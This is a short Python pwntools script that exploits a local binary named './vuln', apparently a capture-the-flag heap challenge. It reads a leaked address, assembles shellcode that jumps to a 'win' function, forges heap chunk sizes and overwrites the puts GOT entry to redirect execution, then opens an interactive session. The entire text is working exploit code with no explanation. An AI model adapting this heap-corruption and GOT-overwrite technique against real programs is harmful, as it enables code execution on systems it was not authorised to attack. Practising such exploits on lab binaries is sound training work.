from pwn import *
s = process('./vuln')

offset = 0x40
win = 0x8048936 
exit = 0x804d02c
puts = 0x804d028
string = 'nop; '*20 + 'push '+hex(win)+'; ret;'
payload1 = asm(string)
s.recvuntil('Oops! a new developer copy pasted and printed an address as a decimal...\n')
address = int(s.recvuntil('\n')) #recv the address of fullname
print ('fullname: 0x%x' % address)
payload = payload1
payload += 'a'*(664-len(payload1))
payload += p32(100, sign = "signed")
payload += p32(-4,sign='signed')
payload += p32(puts - 12)
payload += p32(address)
s.sendline(payload) # send fullname
s.recvuntil('Input lastname\n')
s.sendline('tuan') #send lastname
s.interactive()
